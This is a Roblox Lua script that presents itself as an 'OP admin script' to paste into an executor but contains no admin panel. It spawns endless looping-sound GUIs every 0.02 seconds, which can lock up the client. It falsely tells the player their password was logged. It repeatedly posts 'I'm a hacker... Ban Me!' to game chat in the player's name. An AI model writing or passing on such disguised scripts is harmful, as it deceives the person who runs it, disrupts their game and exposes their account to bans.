--[[
  OP ADMIN SCRIPT V3.9 🔥
  Paste this into your executor for a FULLY UNPATCHED ADMIN PANEL.
  Works in ANY game 💯
]]

local function spawnTrollGui()
    local plr = game:GetService("Players").LocalPlayer
    local gui = Instance.new("ScreenGui", plr:WaitForChild("PlayerGui"))
    gui.Name = "AdminPanel_" .. tostring(math.random(10000, 99999))
    gui.ResetOnSpawn = false

    local label = Instance.new("TextLabel", gui)
    label.Size = UDim2.new(0, 400, 0, 100)
    label.Position = UDim2.new(0, math.random(0, 600), 0, math.random(0, 300))
    label.Text = "💀 YOU AINT GETTING THE SCRIPT. YOUR ACCOUNTS PASS HAS BEEN LOGGED 💀"
    label.TextScaled = true
    label.TextColor3 = Color3.new(1, 0, 0)
    label.BackgroundColor3 = Color3.new(0, 0, 0)
    label.BackgroundTransparency = 0.25
    label.Font = Enum.Font.Arcade

    -- move randomly
    task.spawn(function()
        while true do
            label.Position = UDim2.new(0, math.random(0, 600), 0, math.random(0, 300))
            wait(0.2)
        end
    end)

    -- sound
    local sound = Instance.new("Sound", gui)
    sound.SoundId = "rbxassetid://3200130016" -- funny sound
    sound.Volume = 2
    sound.Looped = true
    sound:Play()
end

-- Start spamming the GUIs
task.spawn(function()
    while true do
        spawnTrollGui()
        wait(0.02)
    end
end)

-- Spam chat with embarrassing message
task.spawn(function()
    while true do
        local args = {
            [1] = "I'm a hacker using a script to exploit! Ban Me!",
            [2] = "All"
        }

        game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents")
            :WaitForChild("SayMessageRequest"):FireServer(unpack(args))
        
        wait(4)
    end
end)
